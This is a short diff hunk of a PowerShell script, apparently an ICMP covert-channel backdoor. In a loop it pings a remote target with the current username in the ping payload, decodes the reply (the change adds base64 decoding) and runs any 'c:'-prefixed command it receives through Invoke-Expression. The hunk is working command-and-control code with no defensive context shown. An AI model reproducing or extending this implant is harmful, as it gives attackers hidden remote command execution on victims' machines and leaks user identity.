@@ -3,7 +3,7 @@ while ($true) {
     $ICMPClient = New-Object System.Net.NetworkInformation.Ping
 
     $r=$ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes("{`"h`": `"$env:USERNAME`"}")) 
-    $r=[System.Text.Encoding]::ASCII.GetString($r.Buffer)
+    $r=[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($r.Buffer))
     Write-Output $r
     if ($r -match "^c:(..*)$") {
         $out = Invoke-Expression $matches[1] 2>&1|out-string
